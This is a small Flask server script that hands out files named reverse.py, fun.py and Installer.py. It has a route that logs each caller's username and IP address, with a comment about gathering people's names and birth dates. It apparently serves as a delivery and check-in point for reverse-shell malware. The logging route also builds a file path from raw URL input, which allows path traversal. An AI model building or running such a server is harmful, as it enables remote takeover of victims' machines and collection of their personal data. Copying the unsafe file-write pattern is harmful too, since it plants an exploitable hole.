from flask import Flask, send_from_directory

app = Flask(__name__)

@app.route('/file1')
def serve_file1():
    return send_from_directory('files', 'reverse.py')

@app.route('/fun')
def serve_file2():
    return send_from_directory('files', 'fun.py')

@app.route('/Installer')
def serve_file3():
    return send_from_directory('files', 'Installer.py')

# add a route where we get the persons name and dob and send it to the server
@app.route('/<Username>/<IP>')
def store_data(Username, IP):
    with open(f'ips/{Username}', 'w') as f:
        f.write(f'{IP}')
    return "Connection Successful"

if __name__ == '__main__':
    app.run(host="0.0.0.0")
